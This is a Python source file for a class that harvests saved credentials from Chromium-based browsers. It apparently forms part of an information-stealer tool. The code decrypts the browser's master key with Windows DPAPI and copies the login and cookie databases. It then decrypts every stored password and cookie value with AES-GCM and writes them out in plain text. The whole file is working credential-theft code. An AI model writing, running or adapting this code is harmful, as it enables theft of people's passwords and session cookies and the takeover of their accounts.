from sqlite3 import connect
from shutil import copyfile
from base64 import b64decode
from json import loads, dump
from os import path, mkdir, remove
from datetime import datetime, timedelta

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData


class Chromium:

    def __init__(self, *args):

        self.browser_name = args[0]
        self.storage_path = args[1]
        self.storage_folder = args[2]

        self.alt_cookies_path = args[6]

        self.statuses = args[7]
        self.errors = args[8]

        self.state_path = args[3]
        self.cookies_path = args[4]
        self.passwords_path = args[5]

    def __check_files(self):

        if any([path.exists(self.passwords_path), path.exists(self.cookies_path)]) and any(self.statuses):
            mkdir(f"{self.storage_path}{self.storage_folder}{self.browser_name}")

    def __get_datetime(self, date):

        if date != 86400000000 and date:
            return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
        else:
            return ""

    def __get_key(self):

        with open(self.state_path, "r", encoding="utf-8") as state:
            return CryptUnprotectData(b64decode(loads(state.read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]

    def __decrypt(self, buff, master_key):

        try:
            return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return "Can't decode"

    def __write_passwords(self, cursor, master_key):

        with open(f"{self.storage_path}{self.storage_folder}/{ self.browser_name}/{self.browser_name} Passwords.txt", "a", encoding="utf-8") as passwords:
            for result in cursor.execute("SELECT action_url, username_value, password_value FROM logins").fetchall():

                password = self.__decrypt(result[2], master_key)

                if any(filter(lambda item: item != "", [result[0], result[1], password])):
                    passwords.write(f"URL: {result[0]}\nUsername: {result[1]}\nPassword: {password}\n\n")
                else:
                    continue

        passwords.close()

    def __write_cookies(self, cursor, master_key):

        with open(f"{self.storage_path}{self.storage_folder}/{ self.browser_name}/{self.browser_name} Cookies.json", "a", encoding="utf-8") as cookies:

            results = []

            for result in cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies").fetchall():

                if not result[2]:
                    decrypted_value = self.__decrypt(result[6], master_key)
                else:
                    decrypted_value = result[2]

                if any([bool(item) for item in result] + [bool(decrypted_value)]):
                    results.append({
                        "host": result[0],
                        "name": result[1],
                        "value": decrypted_value,
                        "creation_datetime": self.__get_datetime(result[3]),
                        "last_access_datetime": self.__get_datetime(result[4]),
                        "expires_datetime": self.__get_datetime(result[5])
                    })
                else:
                    continue

            dump(results, cookies)

        cookies.close()

    def __check_passwords(self):

        try:

            if self.statuses[0] is True:

                if (path.exists(self.passwords_path)) is True:
                    copyfile(self.passwords_path, f"{self.storage_path}{self.browser_name} Passwords.db")
                else:
                    if self.errors is True:
                        print(f"[{self.browser_name.upper()}]: No passwords found")
                    return

                with connect(f"{self.storage_path}{self.browser_name} Passwords.db") as connection:
                    cursor = connection.cursor()
                    self.__write_passwords(cursor, self.__get_key())
                    cursor.close()

                connection.close()
                remove(f"{self.storage_path}{self.browser_name} Passwords.db")

            else:
                return

        except Exception as e:

            if self.errors is True:
                print(f"[{self.browser_name.upper()}]: {repr(e)}")

    def __check_cookies(self):

        try:

            if self.statuses[1] is True:

                if (path.exists(self.cookies_path)) is True:
                    copyfile(self.cookies_path, f"{self.storage_path}{self.browser_name} Cookies.db")

                elif (path.exists(self.alt_cookies_path)) is True:
                    copyfile(self.alt_cookies_path, f"{self.storage_path}{self.browser_name} Cookies.db")

                else:
                    if self.errors is True:
                        print(f"[{self.browser_name.upper()}]: No cookies found")
                    return

                with connect(f"{self.storage_path}{self.browser_name} Cookies.db") as connection:
                    connection.text_factory = lambda text: text.decode(errors="ignore")
                    cursor = connection.cursor()
                    self.__write_cookies(cursor, self.__get_key())
                    cursor.close()

                connection.close()
                remove(f"{self.storage_path}{self.browser_name} Cookies.db")

            else:
                return

        except Exception as e:

            if self.errors is True:
                print(f"[{self.browser_name.upper()}]: {repr(e)}")

    def run(self):

        try:

            self.__check_files()
            self.__check_passwords()
            self.__check_cookies()

        except Exception as e:

            if self.errors is True:
                print(f"[{self.browser_name.upper()}]: {repr(e)}")
